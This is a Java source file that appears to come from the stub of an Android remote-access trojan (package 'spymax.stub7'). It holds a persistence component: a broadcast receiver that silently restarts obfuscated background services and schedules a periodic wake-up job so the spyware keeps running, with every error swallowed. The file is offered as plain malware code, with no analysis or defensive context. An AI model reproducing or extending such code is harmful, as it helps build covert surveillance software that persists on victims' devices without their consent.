package spymax.stub7;

import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class SensorRestarterBroadcastReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context x, Intent intent) {


        try {
            scheduleJob(x);
            ClassGen3.p_ClassGen3_r = x.getResources().getString(R.string.t1t2t3t4t5t6);


            if (ClassGen10._runn_srv_(ClassGen11.class, x)) {
                ClassGen3.p_ClassGen3_r = x.getResources().getString(R.string.t1t2t3t4t5t6);

                    x.startService(new Intent(x, ClassGen11.class));

            }

            if (ClassGen10._runn_srv_(_srv_worker_.class, x)) {

                    x.startService(new Intent(x, _srv_worker_.class));

            }
        } catch (Exception two)
        {

        }
    }

    public static void scheduleJob(Context context) {
        JobScheduler jobScheduler = (JobScheduler)context.getSystemService(Context.JOB_SCHEDULER_SERVICE);
        ComponentName serviceName = new ComponentName(context, WackMeUpJob.class);
        JobInfo jobInfo;
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.N){

            jobInfo = new JobInfo.Builder(100, serviceName)
                    .setPeriodic(900000)
                    .build();
        }else{
            jobInfo = new JobInfo.Builder(100, serviceName)
                    .setPeriodic(15000)
                    .build();
        }
        jobScheduler.schedule(jobInfo);
    }


}